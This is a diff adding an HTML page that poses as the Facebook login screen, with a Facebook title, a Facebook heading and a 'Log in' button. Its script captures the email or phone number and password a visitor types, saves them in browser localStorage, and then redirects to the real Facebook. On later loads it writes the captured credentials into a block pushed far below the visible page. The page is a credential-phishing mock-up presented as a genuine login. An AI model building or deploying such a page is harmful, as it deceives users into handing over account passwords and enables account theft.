@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Log in Facebook</title>
+    <style>
+      p {
+        color: black;
+      }
+      h3 {
+        color: #4552DC;
+        font-size: 50px;
+      }
+      #button1 {
+        padding: 15px;
+        color: white;
+        height: 45px;
+        background: #396BFD;
+        width: 8cm;
+        font-size: 17px;
+        padding-top: 10px;
+        border: 1px solid;
+        border-radius: 5px;
+        font-style: normal;
+        font-weight: bold;
+      }
+      #email, #Password {
+        padding: 10px;
+        height: 20px;
+        width: 270px;
+        margin: 7px;
+      }
+      .con {
+        display: flex;
+        flex-direction: column;
+        text-align: center;
+      }
+      .s {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }.t{
+        margin-top: 1000px
+      }
+    </style>
+  </head>
+  <body>
+    <div class="con">
+      <h3>Facebook</h3>
+      <p>Log in to Facebook</p>
+    </div>
+    <div class="s">
+      <input type="email" placeholder="Mobile number or email address" id="email">
+      <input type="password" placeholder="Password" id="Password"><br>
+      <input type="submit" value="Log in" id="button1">
+    </div>
+    <div class="t">
+      <div id="number">
+<div id="no">
+  
+</div>
+</div>
+<div id="password"></div>
+    </div>
+
+    <script>
+let button1 = document.getElementById('button1');
+
+button1.onclick = async function logIn() { // تأكد من استخدام async هنا
+let numberOrEmail = document.getElementById('email').value.trim();
+let password = document.getElementById('Password').value.trim();
+
+// التحقق من أن القيم غير فارغة قبل تخزينها وإرسالها
+if (numberOrEmail === '' || password === '') {
+alert('الرجاء إدخال البريد الإلكتروني وكلمة المرور');
+return;
+}
+
+let user = {
+number: numberOrEmail,
+userPassword: password
+};
+
+localStorage.setItem('userData', JSON.stringify(user));
+console.log(user); // طباعة بيانات المستخدم للتأكد من نجاح التخزين
+
+window.location.href = "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.facebook.com/%3Flocale%3Dar_AR&ved=2ahUKEwi6_IKas_6FAxU-VfEDHYV3BpkQFnoECAUQAQ&usg=AOvVaw2X1FcBvUUcTYiB_pH59R5-";
+};
+
+// استرجاع البيانات المخزنة من localStorage
+window.onload = function() {
+let storedUserData = localStorage.getItem('userData');
+let number = document.getElementById('number');
+let password = document.getElementById('password');
+if (storedUserData) {
+let user = JSON.parse(storedUserData);
+console.log(user); // طباعة بيانات المستخدم المسترجعة
+number.innerHTML = 'numberOrEmail: ' + user.number;
+password.innerHTML = 'password: ' + user.userPassword;
+} else {
+console.log('No user data found.');
+}
+};  </script>
+  </body>
+</html>
